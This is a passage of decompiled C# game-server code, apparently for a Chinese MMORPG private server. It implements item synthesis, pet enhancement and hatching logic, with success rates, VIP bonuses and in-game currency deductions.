						if (base.FLD_VIP == 1)
						{
							num35 += 100.0 * World.VIP合成率增加百分比;
						}
						if (World.合成率 != 0.0)
						{
							num35 += 100.0 * World.合成率;
						}
						if (GM模式 == 8)
						{
							num37 = 0.0;
						}
						if (World.灵宠强化是否消耗武皇币 != 1)
						{
							goto IL_1f851;
						}
						if (base.Player_Whtb < World.灵宠强化消耗武皇币数量)
						{
							合成提示(275, 4, 0, 装备栏包裹[num30]);
							系统提示("武皇币不足, 强化灵宠需要扣除" + World.灵宠强化消耗武皇币数量 + "武皇币/次。");
							return;
						}
						base.Player_Whtb -= World.灵宠强化消耗武皇币数量;
						系统提示("强化灵宠扣除：" + World.灵宠强化消耗武皇币数量 + " 武皇币");
						更新武功和状态();
						更新人物数据(this);
						goto IL_1f851;
						IL_1f851:
						if (num35 > num37)
						{
							if (value109.FLD_RESIDE2 == 16)
							{
								hcItimesClass79.强化类型 = 19;
							}
							hcItimesClass79.强化数量++;
							if (hcItimesClass79.强化数量 > World.灵宠强化最大数量)
							{
								hcItimesClass79.强化数量 = World.灵宠强化最大数量;
							}
							hcItimesClass79.设置阶段属性();
							if (hcItimesClass79.强化数量 >= int.Parse(World.强化数量大于发送快报[4]))
							{
								发送快报(base.UserName, hcItimesClass79.强化数量, hcItimesClass79.物品id, base.Player_Zx);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass79.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass79.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass79.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass79.位置, 1);
								增加物品(hcItimesClass79.物品全局ID, hcItimesClass79.物品id, hcItimesClass79.位置, hcItimesClass79.物品数量, hcItimesClass79.物品属性);
							}
							装备栏包裹[hcItimesClass79.位置].锁定 = false;
							if (base.FLD_VIP == 1)
							{
								系统提示("恭喜您，VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
							}
							灵宠合成提示(275, 0, 0, 装备栏包裹[num52], 1);
						}
						else
						{
							if (hcItimesClass79.强化数量 >= 3)
							{
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass80.位置].物品ID, 0) == 1008001988)
								{
									hcItimesClass79.强化数量 = hcItimesClass79.强化数量;
								}
								else
								{
									hcItimesClass79.强化数量 -= 3;
								}
							}
							hcItimesClass79.设置阶段属性();
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass79.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass79.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass79.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass79.位置, 1);
								增加物品(hcItimesClass79.物品全局ID, hcItimesClass79.物品id, hcItimesClass79.位置, hcItimesClass79.物品数量, hcItimesClass79.物品属性);
							}
							灵宠合成提示(275, -1, 0, 装备栏包裹[num52], 0);
						}
						减去物品(hcItimesClass80.位置, 1);
						if (hcItimesClass81 != null)
						{
							减去物品(hcItimesClass81.位置, 1);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex35)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex35.Message);
						MainForm.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex35.StackTrace);
					}
					return;
				case 280:
					try
					{
						if (合成物品表.TryGetValue(1, out var value108))
						{
							装备栏包裹[value108.位置].锁定 = false;
							合成物品表.Clear();
							Buffer.BlockCopy(array12, 0, array, 11, 2);
							合成系统解锁();
						}
						元宝合成开关 = 0;
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex34)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex34.Message);
					}
					return;
				case 281:
					try
					{
						if (!合成物品表.ContainsKey(1))
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							HcItimesClass hcItimesClass10 = new HcItimesClass();
							hcItimesClass10.位置 = num30;
							hcItimesClass10.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value107 = hcItimesClass10;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value107);
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex33)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex33.Message);
					}
					return;
				case 282:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
							return;
						}
						HcItimesClass hcItimesClass78 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass78 = 合成物品表[1];
						}
						hcItimesClass78.得到属性();
						hcItimesClass78.强化属性阶段();
						if (!合成物品表.ContainsKey(2) && 装备栏包裹[num30].属性1.属性数量 == hcItimesClass78.属性1.属性数量)
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							HcItimesClass hcItimesClass11 = new HcItimesClass();
							hcItimesClass11.位置 = num30;
							hcItimesClass11.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value106 = hcItimesClass11;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value106);
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex31)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex31.Message);
					}
					return;
				case 283:
					try
					{
						if (合成物品表.Count >= 2 && !合成物品表.ContainsKey(3))
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
							}
							else if (装备栏包裹[num30].Get物品ID == 1008001941)
							{
								HcItimesClass hcItimesClass12 = new HcItimesClass();
								hcItimesClass12.位置 = num30;
								hcItimesClass12.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value105 = hcItimesClass12;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(3, value105);
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex30)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex30.Message);
					}
					return;
				case 284:
					try
					{
						if (合成物品表.Count >= 2 && !合成物品表.ContainsKey(4))
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
							}
							else if (装备栏包裹[num30].Get物品ID == 1008001942)
							{
								HcItimesClass hcItimesClass13 = new HcItimesClass();
								hcItimesClass13.位置 = num30;
								hcItimesClass13.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value104 = hcItimesClass13;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(4, value104);
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex29)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex29.Message);
					}
					return;
				case 285:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass142 = null;
						HcItimesClass hcItimesClass153 = null;
						HcItimesClass hcItimesClass164 = null;
						HcItimesClass hcItimesClass69 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass142 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass153 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass164 = 合成物品表[3];
						}
						if (合成物品表.ContainsKey(4))
						{
							hcItimesClass69 = 合成物品表[4];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass142.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass142.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass153.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass153.物品全局ID, 0) || (hcItimesClass164 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass164.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass164.物品全局ID, 0)) || (hcItimesClass69 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass69.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass69.物品全局ID, 0)) ? true : false)))
						{
							return;
						}
						hcItimesClass142.得到属性();
						hcItimesClass142.强化属性阶段();
						hcItimesClass153.得到属性();
						hcItimesClass153.强化属性阶段();
						if (装备栏包裹[hcItimesClass142.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass142.位置]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass142.物品id, 0), out var value103))
							{
								return;
							}
							if (value103.FLD_RESIDE2 != 16)
							{
								string[] array33 = new string[5] { "合成系统 WGF BUG11[", null, null, null, null };
								array33[1] = BitConverter.ToInt32(hcItimesClass142.物品id, 0).ToString();
								array33[2] = "]-[";
								array33[3] = BitConverter.ToInt32(hcItimesClass153.物品id, 0).ToString();
								array33[4] = "]";
								MainForm.WriteLine(6, string.Concat(array33));
								return;
							}
							double num33 = new Random(World.GetRandomSeed()).Next(0, 100);
							double num34 = hcItimesClass142.属性1.属性数量 * 30;
							if (hcItimesClass142.属性1.属性数量 != hcItimesClass153.属性1.属性数量)
							{
								return;
							}
							if (hcItimesClass164 != null && ((BitConverter.ToInt32(hcItimesClass164.物品id, 0) == 1008001941) ? true : false))
							{
								num33 += 20.0;
							}
							if (公有药品.ContainsKey(1008000312))
							{
								num33 += 10.0;
							}
							if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
							{
								num33 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
							}
							if (元宝合成开关 == 1)
							{
								num33 += 5.0;
							}
							if (World.灵宠进化率 != 0.0)
							{
								num33 += 100.0 * World.灵宠进化率;
							}
							if (base.FLD_VIP == 1)
							{
								num33 += 100.0 * World.VIP合成率增加百分比;
							}
							if (World.合成率 != 0.0)
							{
								num33 += 100.0 * World.合成率;
							}
							if (num33 > num34)
							{
								if (hcItimesClass69 == null)
								{
									hcItimesClass142.强化数量 = 0;
									hcItimesClass142.设置阶段属性();
								}
								hcItimesClass142.属性1.属性类型 = 22;
								hcItimesClass142.属性1.属性数量++;
								hcItimesClass142.设置属性();
								if (base.FLD_VIP == 1)
								{
									系统提示("恭喜您，VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
								}
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
							else
							{
								系统提示("VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
								合成提示(num, -1, 0, 装备栏包裹[num30]);
							}
							减去物品(hcItimesClass153.位置, 1);
							if (hcItimesClass164 != null)
							{
								减去物品(hcItimesClass164.位置, 1);
							}
							if (hcItimesClass69 != null)
							{
								减去物品(hcItimesClass69.位置, 1);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass142.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass142.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass142.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass142.位置, 1);
								增加物品(hcItimesClass142.物品全局ID, hcItimesClass142.物品id, hcItimesClass142.位置, hcItimesClass142.物品数量, hcItimesClass142.物品属性);
							}
							装备栏包裹[hcItimesClass142.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							return;
						}
					}
					catch (Exception ex28)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex28.Message);
					}
					return;
				case 291:
					try
					{
						if (!合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value101) && (value101.FLD_PID == 1000001160 || value101.FLD_PID == 1000001151) && !装备栏包裹[num30].锁定)
						{
							HcItimesClass hcItimesClass14 = new HcItimesClass();
							hcItimesClass14.位置 = num30;
							hcItimesClass14.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value102 = hcItimesClass14;
							装备栏包裹[num30].锁定 = true;
							if (!合成物品表.ContainsKey(1))
							{
								合成物品表.TryAdd(1, value102);
							}
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex27)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "灵宠孵化出错![" + base.Userid + "]-[" + base.UserName + "]" + ex27.Message);
					}
					return;
				case 295:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass131 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass131 = 合成物品表[1];
						}
						if (hcItimesClass131 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass131.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass131.物品全局ID, 0) || !World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass131.物品id, 0), out var value98))
						{
							return;
						}
						if (value98.FLD_PID != 1000001160 && value98.FLD_PID != 1000001151)
						{
							MainForm.WriteLine(6, "孵化系统 合成 BUG1[" + BitConverter.ToInt32(hcItimesClass131.物品id, 0) + "]");
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num52].物品ID, 0), out var value100))
							{
								return;
							}
							if (value100.FLD_PID != 1000001152 && value100.FLD_PID != 1000001169)
							{
								MainForm.WriteLine(6, "孵化系统 合成 BUG2[" + BitConverter.ToInt32(装备栏包裹[num52].物品ID, 0) + "]");
								return;
							}
							if (特殊药品.ContainsKey(1000001150))
							{
								byte[] array32 = Converter.hexStringToByte("AA55120000E2007B030C00000000008E2700000000000055AA");
								Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array32, 5, 2);
								if (base.Client != null)
								{
									base.Client.Send多包(array32, array32.Length);
								}
								return;
							}
							减去物品(num52, 1);
							减去物品(hcItimesClass131.位置, 1);
							增加新宠物带时间(1000001150, hcItimesClass131.位置, 1, 3);
							DateTime d = DateTime.Now.AddDays(3.0);
							DateTime now = DateTime.Now;
							uint 时间 = Convert.ToUInt32(d.ToString("yyMMddHHmm"));
							TimeSpan timeSpan = d - now;
							特殊药品类 特殊药品类2 = new 特殊药品类();
							特殊药品类2.时间 = 时间;
							特殊药品类2.药品ID = 1000001150;
							特殊药品类 特殊药品类3 = 特殊药品类2;
							特殊药品.TryAdd(特殊药品类3.药品ID, 特殊药品类3);
							药品新效果(1000001150, 1, 特殊药品类3.时间, (uint)timeSpan.TotalMinutes);
							装备栏包裹[hcItimesClass131.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							合成提示(num, 0, 0, 装备栏包裹[num52]);
							return;
						}
					}
					catch (Exception ex26)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 孵化场 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex26.Message);
					}
					return;
				case 299:
					try
					{
						if (合成物品表.TryGetValue(1, out var value90))
						{
							装备栏包裹[value90.位置].锁定 = false;
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex25)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex25.Message);
					}
					break;
				case 300:
					try
					{
						if (base.当前操作类型 != 300 || ((合成物品表.Count <= 0) ? true : false))
						{
							break;
						}
						if (base.Player_Money < 10000000)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						base.Player_Money -= 10000000L;
						更新金钱和负重();
						HcItimesClass hcItimesClass109 = null;
						HcItimesClass hcItimesClass120 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass109 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass120 = 合成物品表[2];
						}
						ItmeClass value79 = new ItmeClass();
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass109.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass109.物品全局ID, 0) || (hcItimesClass120 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass120.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass120.物品全局ID, 0)) || !World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass109.物品id, 0), out value79) || (value79.FLD_RESIDE2 != 1 && value79.FLD_RESIDE2 != 4) || (装备栏包裹[hcItimesClass109.位置].物品绑定 ? true : false))
						{
							break;
						}
						byte[] array23 = new byte[4];
						Buffer.BlockCopy(封包数据, 14, array23, 0, 4);
						int num29 = BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array23, 0)].物品ID, 0);
						if (num29 == 0)
						{
							break;
						}
						double num31 = RNG.Next(1, 100);
						double num32 = 10.0;
						int fLD_FJ_四神之力 = 0;
						if (hcItimesClass120 != null)
						{
							num31 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass120.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num31 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num31 += World.VIP合成率增加百分比;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num31 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (World.四神成功几率 != 0.0)
						{
							num31 += 100.0 * World.四神成功几率;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num31 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (num31 >= num32)
						{
							switch (num29)
							{
							case 1000001122:
								fLD_FJ_四神之力 = 1;
								break;
							case 1000001123:
								fLD_FJ_四神之力 = 2;
								break;
							case 1000001124:
								fLD_FJ_四神之力 = 3;
								break;
							case 1000001125:
								fLD_FJ_四神之力 = 4;
								break;
							}
							hcItimesClass109.FLD_FJ_四神之力 = fLD_FJ_四神之力;
							合成提示(num, 1, 10000000, 装备栏包裹[hcItimesClass109.位置]);
							RxjhClass.合成记录(base.Userid, base.UserName, value79.ItmeNAME, num, "四神之力", "成功", 装备栏包裹[hcItimesClass109.位置]);
						}
						else
						{
							合成提示(num, 6, 0, 装备栏包裹[hcItimesClass109.位置]);
							RxjhClass.合成记录(base.Userid, base.UserName, value79.ItmeNAME, num, "四神之力", "失败", 装备栏包裹[hcItimesClass109.位置]);
						}
						if (hcItimesClass120 != null)
						{
							减去物品(hcItimesClass120.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass109.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass109.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass109.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass109.位置, 1);
							增加物品_四神(hcItimesClass109.物品全局ID, hcItimesClass109.物品id, hcItimesClass109.位置, hcItimesClass109.物品数量, hcItimesClass109.物品属性, fLD_FJ_四神之力);
						}
						装备栏包裹[hcItimesClass109.位置].锁定 = false;
						减去物品(BitConverter.ToInt32(array23, 0), 1);
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex24)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex24.Message);
					}
					break;
				case 301:
					try
					{
						if (base.当前操作类型 == 300 && !合成物品表.ContainsKey(1) && !装备栏包裹[num30].锁定 && !装备栏包裹[num30].物品绑定)
						{
							ItmeClass value57;
							if (base.Player_Money < 10000000)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (装备栏包裹[num30].FLD_FJ_觉醒 == 0)
							{
								合成提示(num, 4, 0, 装备栏包裹[num30]);
							}
							else if (装备栏包裹[num30].FLD_FJ_四神之力 != 0)
							{
								合成提示(num, 7, 0, 装备栏包裹[num30]);
							}
							else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value57) && (value57.FLD_RESIDE2 == 1 || value57.FLD_RESIDE2 == 4))
							{
								HcItimesClass hcItimesClass15 = new HcItimesClass();
								hcItimesClass15.位置 = num30;
								hcItimesClass15.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value68 = hcItimesClass15;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value68);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex13)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex13.Message);
					}
					break;
				case 302:
				{
					if (base.当前操作类型 != 300)
					{
						break;
					}
					int num27 = BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0);
					int num28 = num27;
					if ((uint)(num28 - 1000001122) <= 3u)
					{
						if (合成物品表.Count != 0)
						{
							合成物品表.Clear();
						}
						合成提示(num, 1, 0, 装备栏包裹[num30]);
						装备栏包裹[num30].锁定 = true;
						打开仓库中 = true;
					}
					return;
				}
				case 303:
					try
					{
						if (base.当前操作类型 == 300 && 合成物品表 != null && 合成物品表.Count != 0 && 合成物品表.ContainsKey(1) && !合成物品表.ContainsKey(2))
						{
							合成物品表.TryAdd(2, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex87)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex87.Message);
					}
					break;
				case 309:
					try
					{
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成物品表.Clear();
						Buffer.BlockCopy(array12, 0, array, 11, 2);
						合成系统解锁();
					}
					catch (Exception ex76)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 再造合成石-取消 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex76.Message);
						return;
					}
					break;
				case 310:
					try
					{
						HcItimesClass hcItimesClass98;
						int 位置2;
						int fLD_PID2;
						if (合成物品表.Count < 1)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (装备栏包裹[num52].Get物品ID == 0L || ((装备栏包裹[num52].Get物品ID != 1008001753) ? true : false))
							{
								return;
							}
							hcItimesClass98 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass98 = 合成物品表[1];
							}
							位置2 = hcItimesClass98.位置;
							int key = BitConverter.ToInt32(装备栏包裹[位置2].物品ID, 0);
							if (!World.Itme.TryGetValue(key, out var value154))
							{
								return;
							}
							if (value154.FLD_RESIDE2 != 7 && value154.FLD_RESIDE2 != 8 && ((value154.FLD_RESIDE2 != 10) ? true : false))
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
							}
							else if (value154.ItmeNAME.Contains("梅柳真"))
							{
								ItmeClass itme5 = ItmeClass.GetItme(value154.ItmeNAME.Replace("（梅柳真）", ""));
								ItmeClass itme6 = ItmeClass.GetItme(value154.ItmeNAME.Replace("-魔（梅柳真）", ""));
								if (itme5 != null)
								{
									fLD_PID2 = itme5.FLD_PID;
									goto IL_22036;
								}
								if (itme6 != null)
								{
									fLD_PID2 = itme6.FLD_PID;
									goto IL_22036;
								}
							}
							else
							{
								ItmeClass itme7 = ItmeClass.GetItme(value154.ItmeNAME + "（梅柳真）");
								ItmeClass itme8 = ItmeClass.GetItme(value154.ItmeNAME + "-魔（梅柳真）");
								if (itme7 != null)
								{
									fLD_PID2 = itme7.FLD_PID;
									goto IL_22036;
								}
								if (itme8 != null)
								{
									fLD_PID2 = itme8.FLD_PID;
									goto IL_22036;
								}
							}
							return;
						}
						goto end_IL_21d61;
						IL_22036:
						int fLD_MAGIC7 = 装备栏包裹[hcItimesClass98.位置].FLD_MAGIC0;
						int fLD_MAGIC8 = 装备栏包裹[hcItimesClass98.位置].FLD_MAGIC1;
						int fLD_MAGIC9 = 装备栏包裹[hcItimesClass98.位置].FLD_MAGIC2;
						int fLD_MAGIC10 = 装备栏包裹[hcItimesClass98.位置].FLD_MAGIC3;
						int fLD_MAGIC2 = 装备栏包裹[hcItimesClass98.位置].FLD_MAGIC4;
						减去物品(num52, 1);
						减去物品(位置2, 1);
						int 绑定2 = 0;
						if (装备栏包裹[hcItimesClass98.位置].物品绑定)
						{
							绑定2 = 1;
						}
						AddItemWithProperties(fLD_PID2, 位置2, 1, fLD_MAGIC7, fLD_MAGIC8, fLD_MAGIC9, fLD_MAGIC10, fLD_MAGIC2, 0, 0, 0, 绑定2, 0);
						合成物品表.Clear();
						合成系统解锁();
						打开仓库中 = false;
						元宝合成开关 = 0;
						合成提示(num, 1, 0, 装备栏包裹[hcItimesClass98.位置]);
						end_IL_21d61:;
					}
					catch (Exception ex65)
					{
						MainForm.WriteLine(1, "组合错误![" + base.Userid + "]-[" + base.UserName + "]" + ex65.Message);
					}
					return;
				case 311:
					try
					{
						int fLD_PID;
						if (合成物品表.ContainsKey(1))
						{
							合成物品表.Clear();
							合成系统解锁();
						}
						else if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else if ((uint)装备栏包裹[num30].FLD_强化数量 > 10u)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value132))
							{
								return;
							}
							if (value132.FLD_RESIDE2 != 7 && value132.FLD_RESIDE2 != 8 && ((value132.FLD_RESIDE2 != 10) ? true : false))
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0);
							if (value132.ItmeNAME.Contains("梅柳真"))
							{
								ItmeClass itme = ItmeClass.GetItme(value132.ItmeNAME.Replace("（梅柳真）", ""));
								ItmeClass itme2 = ItmeClass.GetItme(value132.ItmeNAME.Replace("-魔（梅柳真）", ""));
								if (itme != null)
								{
									fLD_PID = itme.FLD_PID;
									goto IL_224a6;
								}
								if (itme2 != null)
								{
									fLD_PID = itme2.FLD_PID;
									goto IL_224a6;
								}
							}
							else
							{
								ItmeClass itme3 = ItmeClass.GetItme(value132.ItmeNAME + "（梅柳真）");
								ItmeClass itme4 = ItmeClass.GetItme(value132.ItmeNAME + "-魔（梅柳真）");
								if (itme3 != null)
								{
									fLD_PID = itme3.FLD_PID;
									goto IL_224a6;
								}
								if (itme4 != null)
								{
									fLD_PID = itme4.FLD_PID;
									goto IL_224a6;
								}
							}
							return;
						}
						goto end_IL_221ec;
						IL_224a6:
						HcItimesClass hcItimesClass16 = new HcItimesClass();
						hcItimesClass16.位置 = num30;
						hcItimesClass16.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value143 = hcItimesClass16;
						装备栏包裹[num30].锁定 = true;
						合成物品表.TryAdd(1, value143);
						打开仓库中 = false;
						炼金合成提示(num, 1, 0, 装备栏包裹[num30], fLD_PID);
						end_IL_221ec:;
					}
					catch (Exception ex54)
					{
						MainForm.WriteLine(1, "211披风分解 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex54);
					}
					return;
				case 319:
					try
					{
						if (合成物品表.TryGetValue(1, out var value121))
						{
							装备栏包裹[value121.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex43)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 披风分解取消 210 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex43.Message);
					}
					return;
				case 370:
					try
					{
						if (合成物品表.Count < 1)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (装备栏包裹[num52].Get物品ID != 1008001963 && ((装备栏包裹[num52].Get物品ID != 1008001964) ? true : false))
							{
								return;
							}
							HcItimesClass hcItimesClass87 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass87 = 合成物品表[1];
							}
							int 位置 = hcItimesClass87.位置;
							int num22 = BitConverter.ToInt32(装备栏包裹[位置].物品ID, 0);
							int num23;
							if (World.Itme.TryGetValue(num22, out var value110) && value110.FLD_RESIDE2 == 16)
							{
								switch (num22)
								{
								case 1000001170:
								case 1000001171:
								case 1000001172:
								case 1000001173:
									num23 = 0;
									break;
								case 1000001174:
									num23 = 0;
									break;
								default:
									num23 = ((num22 != 1000001175) ? 1 : 0);
									break;
								}
							}
							else
							{
								num23 = 1;
							}
							if (num23 != 0)
							{
								return;
							}
							int num24 = num22 + 6;
							int num25 = num24;
							int num26 = num25;
							if ((uint)(num26 - 1000001176) <= 5u)
							{
								int fLD_MAGIC = 装备栏包裹[hcItimesClass87.位置].FLD_MAGIC0;
								int fLD_MAGIC3 = 装备栏包裹[hcItimesClass87.位置].FLD_MAGIC1;
								int fLD_MAGIC4 = 装备栏包裹[hcItimesClass87.位置].FLD_MAGIC2;
								int fLD_MAGIC5 = 装备栏包裹[hcItimesClass87.位置].FLD_MAGIC3;
